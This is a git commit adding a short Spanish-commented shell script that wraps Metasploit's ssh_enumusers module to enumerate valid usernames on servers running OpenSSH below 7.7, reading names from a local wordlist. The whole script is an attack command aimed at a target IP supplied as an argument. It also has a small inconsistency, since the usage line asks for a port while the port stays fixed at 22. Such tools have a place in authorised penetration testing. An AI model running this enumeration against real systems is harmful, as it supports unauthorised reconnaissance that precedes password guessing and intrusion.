1045b5253c7de8ce1a1481fe98bb0a157b8eb241
hackingyseguridad <antonio_taboada@hotmail.es>
2025-09-16 11:56:56 +0200

    Create usuariossh.sh

---
+++ usuariossh.sh
@@ -0,0 +1,14 @@
+
+# Antonio Taboada - hackingyseguridad.com 2025
+# OpenSSH < 7.7 - User Enumeration
+# Descargar diccionario de usuarios
+# sh /home/antonio/ssha/actualizar.sh
+echo " # # # Descubre usuarios"
+echo "uso.: ./usuarios.sh IP puerto"
+echo
+
+msfconsole -q -x "use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS $1;set RPORT 22; set USER_FILE /home/antonio/ssha/usuarios.txt; run"
+
+echo ".."
+echo
+
